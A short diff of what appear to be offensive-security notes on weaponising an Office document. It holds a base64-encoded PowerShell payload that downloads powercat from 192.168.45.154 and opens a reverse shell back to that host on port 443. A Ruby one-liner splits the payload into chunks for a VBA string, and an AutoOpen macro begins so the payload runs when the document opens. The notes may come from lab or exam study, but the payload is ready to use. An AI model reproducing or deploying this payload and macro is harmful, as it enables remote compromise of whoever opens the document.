@@ -18,13 +18,12 @@ for our payload we'll download powercat from our hosted web server and base64 it
 we have a string size limitation so we need to split our string into length of 50
 
 ruby one liner 
-  
-    payload = SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4xNTQvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xNTQgLXAgNDQzIC1lIHBvd2Vyc2hlbGw=
-
-  ```ruby
+```ruby  
+payload = SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4xNTQvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xNTQgLXAgNDQzIC1lIHBvd2Vyc2hlbGw=
 payload.chars.each_slice(50).map(&:join).each{|arr|p "Str = Str + #{arr}"}
 ```
-  
+
+vb macro  
 
 ```vb
 Sub AutoOpen()
